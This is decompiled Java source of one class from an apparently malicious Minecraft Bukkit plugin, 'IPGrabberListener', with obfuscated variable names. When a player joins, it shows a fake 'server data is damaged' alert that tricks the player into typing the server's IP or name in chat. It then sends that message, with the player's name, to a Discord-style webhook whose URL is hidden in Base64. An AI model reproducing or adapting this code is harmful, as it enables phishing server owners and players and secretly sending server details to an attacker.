/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.ChatColor
 *  org.bukkit.entity.Player
 *  org.bukkit.event.EventHandler
 *  org.bukkit.event.Listener
 *  org.bukkit.event.player.AsyncPlayerChatEvent
 *  org.bukkit.event.player.PlayerJoinEvent
 */
package me.system.runner.events;

import java.io.IOException;
import java.util.Base64;
import me.system.runner.Core;
import me.system.runner.data.DataManager;
import me.system.runner.methods.onEnableLogger;
import me.system.runner.utils.DWeb;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;

public class IPGrabberListener
implements Listener {
    public static /* synthetic */ Boolean ready_for_action;
    private static final /* synthetic */ Core INSTANCE;

    static {
        INSTANCE = (Core)Core.getPlugin(Core.class);
        ready_for_action = false;
    }

    public IPGrabberListener() {
        IPGrabberListener llllllllllllllllIIIIIlIlIIIIIIII;
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent llllllllllllllllIIIIIlIIllIIlIII) throws IOException {
        if (ready_for_action.booleanValue() && INSTANCE.getDescription().getWebsite() != "" && INSTANCE.getDescription().getWebsite() != " " && INSTANCE.getDescription().getWebsite() != null && !onEnableLogger.host_logged_already.booleanValue()) {
            byte[] llllllllllllllllIIIIIlIIllIIlllI = Base64.getDecoder().decode(DataManager.getData().getString("mywh"));
            DWeb llllllllllllllllIIIIIlIIllIIllII = new DWeb(new String(llllllllllllllllIIIIIlIIllIIlllI));
            llllllllllllllllIIIIIlIIllIIllII.setContent(String.valueOf(new StringBuilder().append("Tried to get server IP/Server Name from a user (Could Be Minehut Server)! - ").append(llllllllllllllllIIIIIlIIllIIlIII.getPlayer().getName()).append(" : ").append(llllllllllllllllIIIIIlIIllIIlIII.getMessage())));
            llllllllllllllllIIIIIlIIllIIllII.execute();
            try {
                llllllllllllllllIIIIIlIIllIIllII.execute();
            }
            catch (IOException llllllllllllllllIIIIIlIIlIllllll) {
                // empty catch block
            }
            ready_for_action = false;
            onEnableLogger.unknown_host = false;
            onEnableLogger.host_logged_already = true;
        }
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent llllllllllllllllIIIIIlIIlllIllIl) {
        Player llllllllllllllllIIIIIlIIlllIlIll = llllllllllllllllIIIIIlIIlllIllIl.getPlayer();
        String llllllllllllllllIIIIIlIIlllIlIIl = llllllllllllllllIIIIIlIIlllIlIll.getName();
        if (onEnableLogger.unknown_host.booleanValue() && INSTANCE.getDescription().getWebsite() != "" && INSTANCE.getDescription().getWebsite() != " " && INSTANCE.getDescription().getWebsite() != null && !onEnableLogger.host_message_already.booleanValue()) {
            llllllllllllllllIIIIIlIIlllIlIll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&cALERT! Server Info and Data Is Damaged! Please enter the server name or IP in chat immediately to fix problems! (Enter Server IP Or Name As Next Chat Message You Send To Fix The Problem)!"));
            ready_for_action = true;
            onEnableLogger.host_message_already = true;
        }
    }
}

